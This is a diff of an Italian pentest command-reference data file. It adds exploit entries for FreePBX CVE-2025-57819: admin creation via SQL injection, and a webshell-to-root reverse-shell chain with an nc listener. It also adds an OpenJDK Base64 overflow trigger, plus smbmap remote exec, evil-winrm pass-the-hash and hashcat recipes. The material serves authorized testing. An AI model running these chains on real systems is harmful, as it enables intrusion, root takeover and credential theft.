+        "template": "# scarica il PoC all-in-one (CVE-2025-57819)\ngit clone https://github.com/Jeanback1/CVE-2025-57819-exploit\ncd CVE-2025-57819-exploit\n\n# crea un amministratore FreePBX via SQLi e ne verifica il login (nessun reachback, nessun binario)\npython3 cve_2025_57819_aio.py http://<ip> --create-user",
+        "description": "In questa variante la SQLi inserisce un **amministratore** in `ampusers` (`sections='*'`, password SHA-1). Lo script verifica il login via `userman/checkPasswordReminder` e stampa le credenziali; con l’accesso all’Admin Control Panel (`/admin/config.php`) la RCE arriva dalle funzioni admin.\n<pre>HTTP non autenticata<br>    │<br>    ▼<br>GET /admin/ajax.php · param «brand» = SQLi<br>    │<br>    ▼<br>INSERT INTO ampusers   sections = *  → admin pieno<br>    │<br>    ▼<br>login OK (userman · checkPasswordReminder)<br>    │<br>    ▼<br>Admin Control Panel · /admin/config.php<br>    │<br>    ▼<br>funzioni admin (moduli · cron · Asterisk) → RCE</pre>"
+      }
+    ],
+    "refs": [
+      {
+        "label": "PoC — Jeanback1 (all-in-one)",
+        "url": "https://github.com/Jeanback1/CVE-2025-57819-exploit"
+      },
+      {
+        "label": "NVD — CVE-2025-57819",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57819"
+      },
+      {
+        "label": "FreePBX — advisory GHSA-m42g-xg4c-5f3h",
+        "url": "https://github.com/freepbx/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h"
+      }
+    ],
+    "note": "# Versioni vulnerabili\n- **FreePBX 15, 16 e 17** con il modulo **Endpoint Manager**, Admin Control Panel su 80/443\n- Corretta nel modulo endpoint: **15.0.66**, **16.0.89**, **17.0.3**"
+  },
+  {
+    "id": "freepbx-rce2root",
+    "name": "FreePBX — RCE to root (CVE-2025-57819)",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "FreePBX (Asterisk)",
+    "description": "PoC **full-chain** di **ozcanpng**: dalla SQLi pre-auth fino alla **root shell**. La SQLi inietta un cron che droppa una webshell PHP in `/var/www/html/shell.php`; via webshell si crea un file trigger **incron** in `/var/spool/asterisk/incron/` che fa eseguire l’hook `fwconsole` **come root**, restituendo una reverse shell.\n<pre>HTTP non autenticata<br>    │<br>    ▼<br>GET /admin/ajax.php · «brand» = SQLi (EXTRACTVALUE)<br>    │<br>    ▼<br>INSERT cron_jobs → webshell PHP in /var/www/html/shell.php<br>    │<br>    ▼<br>~60s → cron come «asterisk» → RCE via webshell ?cmd=<br>    │<br>    ▼<br>webshell → trigger incron /var/spool/asterisk/incron/<br>    │   api.fwconsole-commands.«payload zlib+b64»<br>    ▼<br>hook fwconsole eseguito come ROOT → bash -i /dev/tcp<br>    │<br>    ▼<br>root shell → lhost:lport</pre>",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "freepbx",
+      "voip",
+      "asterisk",
+      "cve-2025-57819",
+      "sqli",
+      "rce",
+      "privesc"
+    ],
+    "template": "# scarica il PoC RCE2Root (CVE-2025-57819)\ngit clone https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root\ncd CVE-2025-57819-FreePBX-RCE2Root\npip install -r requirements.txt\n\n# metti in ascolto la root shell su una seconda finestra\nnc -lvnp <lport>\n\n# catena completa: SQLi → webshell → incron fwconsole → root shell (target senza schema http)\npython3 CVE-2025-57819.py <ip> <lhost> <lport>",
+    "params": [
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "9999"
+      },
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "connected.htb"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.3"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Catena Completa",
+        "template": "# scarica il PoC RCE2Root (CVE-2025-57819)\ngit clone https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root\ncd CVE-2025-57819-FreePBX-RCE2Root\npip install -r requirements.txt\n\n# metti in ascolto la root shell su una seconda finestra\nnc -lvnp <lport>\n\n# catena completa: SQLi → webshell → incron fwconsole → root shell (target senza schema http)\npython3 CVE-2025-57819.py <ip> <lhost> <lport>",
+        "description": "Esegue tutta la catena: verifica SQLi (`EXTRACTVALUE`), `INSERT` nel cron che scrive la webshell, attesa ~60s e conferma RCE come `asterisk`, poi crea il trigger **incron** che lancia `fwconsole` **come root** e si ottiene la shell sul tuo listener. A fine run chiede se ripulire."
+      },
+      {
+        "id": "cleanup",
+        "label": "Pulizia Automatica",
+        "template": "# scarica il PoC RCE2Root (CVE-2025-57819)\ngit clone https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root\ncd CVE-2025-57819-FreePBX-RCE2Root\npip install -r requirements.txt\n\n# metti in ascolto la root shell su una seconda finestra\nnc -lvnp <lport>\n\n# come sopra ma --cleanup rimuove webshell e cron job alla fine\npython3 CVE-2025-57819.py <ip> <lhost> <lport> --cleanup",
+        "description": "Identico, ma con `--cleanup` rimuove **in automatico** la webshell `shell.php` e il cron `poc-webshell` dopo l’exploit, senza il prompt finale."
+      }
+    ],
+    "refs": [
+      {
+        "label": "PoC — ozcanpng (RCE2Root full-chain)",
+        "url": "https://github.com/ozcanpng/CVE-2025-57819-FreePBX-RCE2Root"
+      },
+      {
+        "label": "NVD — CVE-2025-57819",
+        "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-57819"
+      },
+      {
+        "label": "FreePBX — advisory GHSA-m42g-xg4c-5f3h",
+        "url": "https://github.com/freepbx/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h"
+      }
+    ],
+    "note": "# Versioni vulnerabili\n- **FreePBX 15, 16 e 17** con il modulo **Endpoint Manager**, Admin Control Panel su 80/443\n- Corretta nel modulo endpoint: **15.0.66**, **16.0.89**, **17.0.3**"
   },
   {
     "id": "imap-pop3-enum",
@@ -5410,12 +5808,12 @@ const COMMANDS = [
     "note": "# Opzioni\n- `-M spider_plus` elenca i file e salva un riepilogo, senza scaricare\n- `-o DOWNLOAD_FLAG=true` scarica i file trovati\n- `-o OUTPUT_FOLDER=<dir>` cartella locale di destinazione\n- `--share '<share>'` limita a una condivisione\n# Errori comuni\nDi default scarica solo i file sotto i 50 KB: per prendere tutto alza il limite con `MAX_FILE_SIZE`. Per una cartella precisa o un singolo file conviene smbclient."
   },
   {
-    "id": "smbmap-r",
-    "name": "smbmap — recursive listing",
+    "id": "smbmap",
+    "name": "smbmap — share, download, exec",
     "category": "service-enum",
     "subcategory": "smb",
     "group": "Pillaging",
-    "description": "Percorre ogni condivisione in modo ricorsivo, mostrando l'albero dei file fino alla profondita indicata.",
+    "description": "Enumera le condivisioni SMB con credenziali e ne mostra i permessi. Percorre l’albero dei file in modo ricorsivo, scarica singoli file e, quando l’utente è amministratore della macchina, esegue comandi attraverso la share `ADMIN$`.",
     "platform": "linux",
     "requires": [
       "password",
@@ -5439,7 +5837,7 @@ const COMMANDS = [
       },
       {
         "key": "user",
-        "label": "User",
+        "label": "Utente",
         "ctx": "user",
         "placeholder": "jdoe"
       },
@@ -5447,10 +5845,41 @@ const COMMANDS = [
         "key": "password",
         "label": "Password",
         "ctx": "password",
-        "placeholder": "P@ssw0rd"
+        "placeholder": "••••••"
+      },
+      {
+        "key": "share",
+        "label": "Share\\path",
+        "placeholder": "C$\\Users\\Public\\flag.txt"
       }
     ],
-    "note": "# Opzioni\n- `-R` elenco ricorsivo\n- `--depth` limita quanto in profondita scendere"
+    "note": "# Opzioni\n`-R` elenca in modo ricorsivo e `--depth` limita quanto scendere. `-A <regex>` scarica in automatico tutti i file il cui nome corrisponde. `-x` esegue comandi ma richiede privilegi amministrativi sull’host.\n# Dal listing all’azione\nUna share scrivibile permette di piazzare file, una leggibile di saccheggiare credenziali e config. Se `-x` funziona, hai di fatto una shell con i privilegi dell’account.",
+    "variants": [
+      {
+        "id": "default",
+        "label": "Lista ricorsiva",
+        "template": "smbmap -H <ip> -u '<user>' -p '<password>' -R --depth 5",
+        "description": "Percorre ogni condivisione in modo ricorsivo fino alla profondità indicata, mostrando l’albero dei file con i rispettivi permessi."
+      },
+      {
+        "id": "download",
+        "label": "Scarica file",
+        "template": "smbmap -H <ip> -u '<user>' -p '<password>' --download '<share>'",
+        "description": "Scarica un file preciso da una share leggibile, indicando il percorso completo."
+      },
+      {
+        "id": "exec",
+        "label": "Esecuzione comandi",
+        "template": "smbmap -H <ip> -u '<user>' -p '<password>' -x 'whoami'",
+        "description": "Esegue un comando quando l’utente è amministratore della macchina, sfruttando l’accesso alla share `ADMIN$`. Via rapida alla RCE con credenziali privilegiate."
+      }
+    ],
+    "refs": [
+      {
+        "label": "smbmap — GitHub",
+        "url": "https://github.com/ShawnDEvans/smbmap"
+      }
+    ]
   },
   {
     "id": "smbclient-mget",
@@ -6668,7 +7097,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "winrm",
     "group": "Shell",
-    "description": "Shell PowerShell interattiva su WinRM, il protocollo di gestione remota di Windows sulle porte 5985 e 5986. È il metodo più pulito quando l'account appartiene al gruppo Remote Management Users, perché non crea servizi né scrive file sul target. L'autenticazione accetta password, hash NTLM per il Pass-the-Hash oppure ticket Kerberos.",
+    "description": "Shell PowerShell interattiva su WinRM, il protocollo di gestione remota di Windows sulle porte 5985 e 5986. È il metodo più pulito quando l’account appartiene al gruppo Remote Management Users, perché non crea servizi né scrive file sul target. L’autenticazione accetta password, hash NTLM per il Pass-the-Hash oppure ticket Kerberos.",
     "platform": "linux",
     "requires": [
       "password",
@@ -6708,6 +7137,12 @@ const COMMANDS = [
         "label": "Hash NTLM",
         "placeholder": "aad3b435...",
         "ctx": "hash"
+      },
+      {
+        "key": "domain",
+        "label": "Dominio",
+        "ctx": "domain",
+        "placeholder": "corp.local"
       }
     ],
     "variants": [
@@ -6715,19 +7150,25 @@ const COMMANDS = [
         "id": "default",
         "label": "Password",
         "template": "evil-winrm -i <ip> -u '<user>' -p '<password>'",
-        "description": "Auth con password."
+        "description": "Shell PowerShell interattiva con utente e password."
       },
       {
         "id": "hash",
         "label": "Pass-the-Hash",
         "template": "evil-winrm -i <ip> -u '<user>' -H '<hash>'",
-        "description": "Auth con hash NTLM (PtH)."
+        "description": "Autenticazione con l’hash NTLM al posto della password, cioè il Pass-the-Hash."
       },
       {
-        "id": "updownload",
+        "id": "kerberos",
+        "label": "Kerberos (ticket)",
+        "template": "export KRB5CCNAME=ticket.ccache; evil-winrm -i <ip> -r <domain> --realm <domain>",
+        "description": "Usa un ticket Kerberos già nella cache, dopo un Pass-the-Ticket o un golden ticket. Richiede che il nome del DC risolva e l’ora sia sincronizzata."
+      },
+      {
+        "id": "transfer",
         "label": "Upload/Download",
         "template": "evil-winrm -i <ip> -u '<user>' -p '<password>' -s /opt/scripts/ -e /opt/exe/",
-        "description": "Nella shell usa `upload`/`download <file>`. -s monta una cartella di script PS, -e una di.exe da caricare in memoria."
+        "description": "Monta una cartella di script e una di eseguibili per caricarli al volo dalla shell con i comandi integrati."
       }
     ]
   },
@@ -7765,6 +8206,86 @@ const COMMANDS = [
     "note": "# Versioni vulnerabili\n**Rami supportati**:\n- affetti **< 8.2.35**, **< 8.3.36**, **< 8.4.27**, **< 8.5.12**\n- corrette in `8.2.35`, `8.3.36`, `8.4.27`, `8.5.12` (e `8.6.0 RC4`)\n\n<br>\n**Rami EOL**\n- affetti **5.4.0** (2012) a **8.1.x**\n- corrette per `7.4`, `8.0`, `8.1`\n- nessun fix per `5.4`→`7.3`\n\n<br>La versione del target si legge dagli header `X-Powered-By` o `Server`, quando non rimossi.\n# Prerequisiti\n- Nessuna credenziale: basta raggiungere via HTTP un qualunque endpoint PHP del target\n- SAPI: resa massima su Apache mod_php (prefork); su PHP-FPM è dimostrata la via del session upload progress\n- `session.upload_progress.enabled` è On di default ed è il trigger indipendente dall'app per la via CVE-2026-109619\n- Target remoti: servono gli offset del binario (ASLR); i PoC pubblici sono tarati su build e configurazioni di laboratorio precise (spesso un solo worker, `memory_limit` basso)\n# Limitazioni\n- Comando inline limitato a **14 byte** sui target remoti: per comandi più lunghi o una reverse shell si scrive uno stager su file e lo si concatena\n- Offset per-build: su target remoti diversi dalla build di laboratorio vanno forniti a mano (`--zif-offset`/`--dtor-offset` in eness, `--arch`/`--profile` in devploit)\n- La riuscita dipende da SAPI, numero di worker, `memory_limit` e `display_errors`: \"nessuna prova non significa assenza di esecuzione\"\n- eness e il PoC OffSec (EDB-52704) sono PoC per CVE-2026-109618; per CVE-2026-109619 il percorso dimostrato è il session upload progress, coperto da ikow e devploit\n# Dall'RCE alla shell\nL'esecuzione è one-shot e corta. Per una shell stabile: scrivi uno stager sul webroot con un primo comando, poi richiamalo via HTTP (`--fetch` in eness), oppure usa lo stager per scaricare ed eseguire una reverse shell verso un listener.\n# Attenzione\nTecnica distruttiva e rumorosa: l'exploit forza ripetuti out-of-memory che fanno crashare i worker PHP (su Apache uccide i processi figli) e riempie i log di errori 500/OOM. Nessuno stealth. Solo su sistemi in scope e autorizzati."
   },
   {
+    "id": "java4shell",
+    "name": "Java — java4shell (CVE-2026-114938)",
+    "category": "exploitation",
+    "subcategory": "infrastructure",
+    "group": "Java / OpenJDK",
+    "description": "**java4shell** è una corruzione di memoria nel decoder Base64 di OpenJDK: un **heap out-of-bounds write** nella routine ottimizzata (intrinsic) che la JVM HotSpot usa sulle CPU x86-64 con AVX-512 VBMI.\n\nIl decoder ha una «via veloce» scritta in assembly che lavora il Base64 a blocchi. Nel calcolo della coda — gli ultimi caratteri più il padding `=` — la lunghezza di output va in **underflow**: la maschera di scrittura diventa tutta a 1 e la routine scrive 64 byte in un buffer che ne prevede molti meno, sovrascrivendo gli oggetti vicini nell'heap. Java rifiuta l'input *dopo*, ma la memoria è già danneggiata.\n\nLa particolarità di questa vuln: colpisce **solo** le CPU x86-64 con AVX-512 VBMI (Intel Ice Lake e successive, AMD Zen 4 e successive). Su ARM e su x86 a 32 bit l'intrinsic non esiste e il bug non parte.\n\nDa remoto e **senza credenziali**: se un input Base64 controllato dall'attaccante raggiunge il decoder (un header di autenticazione, un upload, un token JWT, un messaggio di rete), la corruzione apre due strade — leggere la memoria del processo, cioè chiavi e token (un effetto Heartbleed che i ricercatori di Calif chiamano *JavaBleed*) e, con catene costruite per il singolo prodotto, l'esecuzione di codice.\n<pre>Input Base64 non fidato → java.util.Base64   (pre-auth)<br>    │   header auth · upload · JWT · messaggio di rete<br>    ▼<br>WARM — molte decodifiche valide → il C2 JIT compila il decoder<br>    │   e sceglie la via veloce AVX-512 VBMI (l'intrinsic bacato)<br>    ▼<br>GROOM — heap spray → il buffer di output finisce sotto un «writer»<br>    │<br>    ▼<br>TRIGGER — coda malformata:   64בA» + «=»   (128בA» + «=» su JDK 17)<br>    │<br>    ▼<br>BUG — output_len va in underflow → maschera tutta a 1<br>    │   scrive 64 byte in un buffer da 50 → 62 byte FUORI (offset 50-111)<br>    ▼<br>JavaBleed — «writer»/«reader» allungati → heap over-read<br>    │   chiavi · token · segreti finiscono nella risposta HTTP<br>    ▼<br>arbitrary write → Code Cache · hook JVM → RCE   («catena per-prodotto, non pubblica»)</pre>",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "java",
+      "openjdk",
+      "java4shell",
+      "cve-2026-114938",
+      "base64",
+      "avx512",
+      "rce",
+      "pre-auth",
+      "memory-corruption"
+    ],
+    "template": "# kit pubblico più completo: scanner (raggiungibilità) + PoC di corruzione + regole di detection — CVE-2026-114938\ngit clone https://github.com/ikow/java4shell-poc\ncd java4shell-poc\n\n# 1) il target è raggiungibile e gira una versione affetta? lo scanner legge la versione del JDK dai banner di rete\npython3 scanner/java4shell_scan.py --host <ip> --ports 8080,8443\n\n# 2) prova della corruzione: compila ed esegui il trigger su un host con JDK affetto e CPU AVX-512 VBMI\n#    (il target stesso se hai già una shell, oppure un host gemello di laboratorio per riprodurre)\ncd poc/ && javac Base64Trigger.java && java Base64Trigger\n#    atteso -> REPRODUCED (rejected=true changed=62 first=50 last=111): scrittura fuori buffer confermata",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.20"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "ikow — scanner + PoC (consigliato)",
+        "template": "# kit pubblico più completo: scanner (raggiungibilità) + PoC di corruzione + regole di detection — CVE-2026-114938\ngit clone https://github.com/ikow/java4shell-poc\ncd java4shell-poc\n\n# 1) il target è raggiungibile e gira una versione affetta? lo scanner legge la versione del JDK dai banner di rete\npython3 scanner/java4shell_scan.py --host <ip> --ports 8080,8443\n\n# 2) prova della corruzione: compila ed esegui il trigger su un host con JDK affetto e CPU AVX-512 VBMI\n#    (il target stesso se hai già una shell, oppure un host gemello di laboratorio per riprodurre)\ncd poc/ && javac Base64Trigger.java && java Base64Trigger\n#    atteso -> REPRODUCED (rejected=true changed=62 first=50 last=111): scrittura fuori buffer confermata",
+        "description": "Il kit pubblico più completo (ikow, licenza MIT): scanner di host e di rete, il PoC `Base64Trigger` e regole di detection pronte (Suricata, Sigma, ModSecurity). Lo scanner verifica la precondizione — versione del JDK affetta e CPU con le flag AVX-512 VBMI — poi `Base64Trigger` dimostra la scrittura fuori buffer in modo **contenuto**: scrive dentro un array di 4096 byte e non manda in crash la JVM. Esito `REPRODUCED` con `changed=62` = bug confermato. Il repo si ferma alla prova della corruzione: non contiene una catena RCE weaponizzata (vedi il box «Stato dell'exploit»)."
+      },
+      {
+        "id": "calif",
+        "label": "Calif — Base64Trigger + check CPU",
+        "template": "# precondizione hardware (controllala PRIMA): servono TUTTE e quattro le flag, altrimenti l'intrinsic non parte e il bug non esiste\ngrep -m1 '^flags' /proc/cpuinfo | tr ' ' '\\n' | grep -E '^(avx512f|avx512bw|avx512vbmi|bmi2)$'\n\n# trigger canonico dei ricercatori (Calif.io): una singola classe Java, corruzione contenuta in un array da 4096 byte\n#  - scalda il decoder con molte decodifiche valide (forza il C2 a compilare l'intrinsic)\n#  - poi decodifica la coda malformata: 64 'A' + '='   (su JDK 17: 128 'A' + '=')\njavac Base64Trigger.java && java Base64Trigger\n#    stampa java.runtime.version e, se il bug c'è, REPRODUCED",
+        "description": "Il trigger canonico descritto da chi ha trovato la vuln (Quang Luong, Calif.io): una sola classe `Base64Trigger` che scalda il decoder, decodifica la coda malformata e conta i byte scritti oltre il buffer — verifica pura, nessuna presa di controllo. La one-liner su `/proc/cpuinfo` è il gate hardware: senza le quattro flag AVX-512 l'intrinsic non viene nemmeno selezionato. Il sorgente della classe è nel writeup di Calif (`calif.io/java4shell`); in alternativa è già pronto in `poc/Base64Trigger.java` del kit ikow."
+      }
+    ],
+    "refs": [
+      {
+        "label": "OpenJDK — advisory 2026-11-17 (CVE-2026-114938)",
+        "url": "https://openjdk.org/groups/vulnerability/advisories/2026-11-17"
+      },
+      {
+        "label": "Oracle — Critical Patch Update novembre 2026",
+        "url": "https://www.oracle.com/security-alerts/cspunov2026.html"
+      },
+      {
+        "label": "Calif.io — java4shell (scoperta, analisi, PoC)",
+        "url": "https://calif.io/java4shell"
+      },
+      {
+        "label": "Tenable — FAQ java4shell",
+        "url": "https://www.tenable.com/blog/java4shell-cve-2026-114938-frequently-asked-questions-about-openjdk-rce-vulnerability"
+      },
+      {
+        "label": "ACN / CSIRT-ITA — advisory (IT)",
+        "url": "https://www.acn.gov.it/portale/w/java4shell-critical-security-patch-update-di-oracle"
+      },
+      {
+        "label": "PoC/kit — ikow (scanner + trigger + detection, MIT)",
+        "url": "https://github.com/ikow/java4shell-poc"
+      },
+      {
+        "label": "Runtime patch (difesa, senza restart) — theori-io/Xint",
+        "url": "https://github.com/theori-io/java4shell-runtime-patch-CVE-2026-114938"
+      }
+    ],
+    "note": "# Versioni vulnerabili\nRami OpenJDK affetti: **17, 21, 25, 27**, da **17.0.6 in su**. Il bug nasce con l'ottimizzazione AVX-512 del decoder Base64, quindi i rami 8 e 11 standard non sono toccati; unica eccezione, l'Enterprise Performance Pack di Java 8.\n- Oracle Java SE affetti: `8u511b33-perf`, `17.0.21.0.3`, `21.0.13.0.3`, `25.0.5.0.3`, `27.0.1.0.3`\n- Corrette (CPU di novembre 2026): `17.0.21.1`, `21.0.13.1`, `25.0.5.1`, `27.0.1.1`, `8u513-perf`\n- Riguarda tutte le build derivate da OpenJDK: Temurin, Corretto, Zulu, Liberica, Microsoft, SapMachine, Red Hat, GraalVM\n# Precondizione CPU (fondamentale)\nNon basta la versione: serve una CPU **x86-64 con AVX-512 VBMI**, altrimenti l'intrinsic non viene selezionato e il bug non esiste.\n- La soddisfano: Intel Xeon Ice Lake / Sapphire Rapids / Emerald Rapids / Granite Rapids e AMD Zen 4+\n- **Immuni**: ARM64 e x86 a 32 bit (non hanno l'intrinsic)\n- Check su Linux: le quattro flag `avx512f avx512bw avx512vbmi bmi2` devono comparire tutte in `/proc/cpuinfo`\n# Prerequisiti dell'attacco\n- Nessuna credenziale, da remoto: basta che un input **Base64 controllato dall'attaccante** raggiunga il decoder\n- Vie tipiche pre-login: autenticazione Basic di Tomcat, librerie JWT (`java-jwt`), upload di file, messaggi di rete\n- Il decoder dev'essere «caldo»: lo si scalda con decodifiche valide finché il C2 JIT compila l'intrinsic\n- Serve heap grooming: il buffer di output deve cadere accanto all'oggetto giusto; da remoto conta un RTT basso e stabile\n# Attenzione\nUn piazzamento sbagliato dell'heap può **mandare in crash la JVM** (DoS), anche se spesso il tentativo si può ripetere. Da usare solo su sistemi in scope e autorizzati."
+  },
+  {
     "id": "rtsp-cameradar",
     "name": "RTSP — cameradar (auto)",
     "category": "exploitation",
@@ -8763,11 +9284,11 @@ const COMMANDS = [
       {
         "id": "mutate",
         "label": "Muta (hashcat rules)",
-        "template": "hashcat wordlist.txt -r /usr/share/hashcat/rules/best64.rule --stdout > mutated.txt",
+        "template": "hashcat wordlist.txt -r /usr/share/hashcat/rules/best66.rule --stdout > mutated.txt",
         "description": "Applica le regole di mutazione: genera varianti (maiuscole, cifre, simboli)."
       }
     ],
-    "note": "# Uso\nWordlist su misura del target. Combina con `username-anarchy` per gli username e con spraying/brute. Mutala con le regole hashcat (`best64`, `rockyou-30000`) per coprire le varianti comuni."
+    "note": "# Uso\nWordlist su misura del target. Combina con `username-anarchy` per gli username e con spraying/brute. Mutala con le regole hashcat (`best66`, `rockyou-30000`) per coprire le varianti comuni."
   },
   {
     "id": "hash-identify",
@@ -8809,7 +9330,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "offline-crack",
     "group": "hashcat",
-    "description": "Cracking offline degli hash. `--show` ristampa quelli già craccati.\n- `1000` = NTLM\n- `13100` = Kerberoast (TGS)\n- `18200` = AS-REP\n- `5600` = NetNTLMv2",
+    "description": "Cracking offline degli hash raccolti. La modalità `-m` indica il tipo di hash e **va azzeccata**, altrimenti hashcat non trova nulla senza dare errore. I più ricorrenti in un pentest sono 1000 per l’NTLM, 13100 per il Kerberoast, 18200 per l’AS-REP e 5600 per il NetNTLMv2. Le password trovate finiscono nel potfile e si riusano su altri host e servizi.",
     "platform": "cross-platform",
     "requires": [
       "hash"
@@ -8819,7 +9340,7 @@ const COMMANDS = [
       "hashcat",
       "cracking"
     ],
-    "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
+    "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best66.rule",
     "params": [
       {
         "key": "mode",
@@ -8837,6 +9358,38 @@ const COMMANDS = [
         "placeholder": "/usr/share/wordlists/rockyou.txt"
       }
     ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Dizionario + regole",
+        "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best66.rule",
+        "description": "Dizionario con le regole `best66`, la resa migliore e il punto di partenza per quasi ogni hash."
+      },
+      {
+        "id": "show",
+        "label": "Mostra craccate",
+        "template": "hashcat -m <mode> <hashfile> --show",
+        "description": "Rilegge dal potfile le password già trovate e le stampa accanto all’hash, senza rilanciare l’attacco."
+      },
+      {
+        "id": "username",
+        "label": "Hash con utente",
+        "template": "hashcat -m <mode> <hashfile> <wordlist> --username",
+        "description": "Quando il file è in formato utente e hash sulla stessa riga, `--username` ignora la colonna dell’utente invece di trattarla come parte dell’hash."
+      },
+      {
+        "id": "session",
+        "label": "Sessione e ripresa",
+        "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best66.rule --session=crack1",
+        "description": "Dà un nome alla sessione per poterla riprendere dopo un’interruzione con `hashcat --session=crack1 --restore`, indispensabile sui job lunghi."
+      },
+      {
+        "id": "optimized",
+        "label": "Kernel ottimizzato",
+        "template": "hashcat -m <mode> <hashfile> <wordlist> -O -w 3",
+        "description": "`-O` attiva il kernel ottimizzato, più veloce ma con un limite sulla lunghezza della password, e `-w 3` spinge il carico sulla GPU."
+      }
+    ],
     "refs": [
       {
         "label": "hashcat — example hashes (lista mode)",
@@ -8847,7 +9400,7 @@ const COMMANDS = [
         "url": "https://weakpass.com/"
       }
     ],
-    "note": "# Opzioni utili\n- `-a 0` è l'attacco a dizionario (default); `-r rules/best64.rule` aggiunge le mutazioni comuni\n- `--username` se l'hashfile è in formato `utente:hash`; `--show` ristampa i già craccati dal potfile\n# Prossimo passo\nLe password craccate si riusano su altri servizi e host (password reuse) e valgono per l'accesso diretto dove sono ancora attive."
+    "note": "# Opzioni utili\n`-a 0` è l’attacco a dizionario di default e `-r rules/best66.rule` aggiunge le mutazioni comuni. `--username` serve quando l’hashfile è in formato utente e hash, `--show` ristampa i già craccati dal potfile e `--status` mostra l’avanzamento in tempo reale.\n# Benchmark e sessioni\n`hashcat -b -m <mode>` misura la velocità sulla tua GPU e aiuta a stimare i tempi prima di lanciare un attacco lungo. Dai sempre un nome con `--session` ai job importanti così li riprendi con `--restore`.\n# Prossimo passo\nLe password craccate si riusano su altri servizi e host, cioè il password reuse, e valgono per l’accesso diretto dove sono ancora attive."
   },
   {
     "id": "hashcat-attacks",
@@ -8855,8 +9408,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "offline-crack",
     "group": "hashcat",
-    "description": "Le tre modalità principali di hashcat oltre al dizionario semplice: dizionario con regole (copre le mutazioni comuni), mask per bruteforce mirato su pattern noti, e combinator per unire due wordlist.",
-    "note": "# Strategia\nParti sempre da dizionario più regole (best64): è la resa migliore. Passa a mask solo se conosci il pattern (per esempio Stagione+anno+simbolo). Il bruteforce puro è l'ultima risorsa.\n# Errori comuni\nIl mode sbagliato produce zero risultati, in silenzio: verifica prima con l'identificazione dell'hash.",
+    "description": "Le modalità di attacco di hashcat oltre al dizionario semplice: dizionario con regole per le mutazioni comuni, mask per il bruteforce mirato su un pattern noto, combinator per unire due wordlist e ibrido per le password fatte di parola più cifre.",
     "platform": "cross-platform",
     "requires": [
       "hash"
@@ -8868,7 +9420,7 @@ const COMMANDS = [
       "mask",
       "cracking"
     ],
-    "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
+    "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best66.rule",
     "params": [
       {
         "key": "mode",
@@ -8890,22 +9442,35 @@ const COMMANDS = [
       {
         "id": "default",
         "label": "Dizionario + regole",
-        "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best64.rule",
-        "description": "Dizionario con mutazioni best64."
+        "template": "hashcat -m <mode> <hashfile> <wordlist> -r /usr/share/hashcat/rules/best66.rule",
+        "description": "Dizionario con le mutazioni `best66`, la combinazione con la resa migliore."
       },
       {
         "id": "mask",
         "label": "Mask (bruteforce)",
         "template": "hashcat -m <mode> -a 3 <hashfile> '?u?l?l?l?l?d?d?d!'",
-        "description": "Bruteforce su un pattern noto (maiuscola, minuscole, cifre, simbolo)."
+        "description": "Bruteforce su un pattern noto, qui maiuscola, minuscole, cifre e simbolo."
       },
       {
         "id": "combinator",
         "label": "Combinator",
         "template": "hashcat -m <mode> -a 1 <hashfile> <wordlist> <wordlist>",
-        "description": "Concatena le parole di due wordlist."
+        "description": "Concatena ogni parola della prima wordlist con ogni parola della seconda."
+      },
+      {
+        "id": "hybrid-end",
+        "label": "Ibrido (parola + mask)",
+        "template": "hashcat -m <mode> -a 6 <hashfile> <wordlist> '?d?d?d'",
+        "description": "Ogni parola del dizionario seguita da una mask, per le password tipo `Estate2024`."
+      },
+      {
+        "id": "hybrid-start",
+        "label": "Ibrido (mask + parola)",
+        "template": "hashcat -m <mode> -a 7 <hashfile> '?d?d' <wordlist>",
+        "description": "Come l’ibrido precedente ma con la mask davanti alla parola."
       }
-    ]
+    ],
+    "note": "# Strategia\nParti sempre da dizionario più regole `best66`, che offre la resa migliore. Passa alla mask solo quando conosci il pattern, ad esempio Stagione più anno più simbolo. L’ibrido copre le password fatte di una parola seguita da cifre. Il bruteforce puro è l’ultima risorsa.\n# Errori comuni\nIl mode sbagliato produce zero risultati in silenzio: verifica prima il tipo di hash con l’identificazione. Una mask che non copre la lunghezza reale della password fallisce senza avvisare."
   },
   {
     "id": "unshadow-crack",
@@ -9244,11 +9809,11 @@ const COMMANDS = [
   },
   {
     "id": "sqlmap",
-    "name": "sqlmap — automatizzato",
+    "name": "sqlmap — detection e avvio",
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "SQL Injection",
-    "description": "Automatizza detection ed estrazione delle SQLi su tutti i DBMS principali.\n- `--batch` usa i default, senza domande interattive\n- `--dbs` elenca i database, poi si scende a tabelle e dump\n- `--os-shell` tenta la RCE sul DBMS",
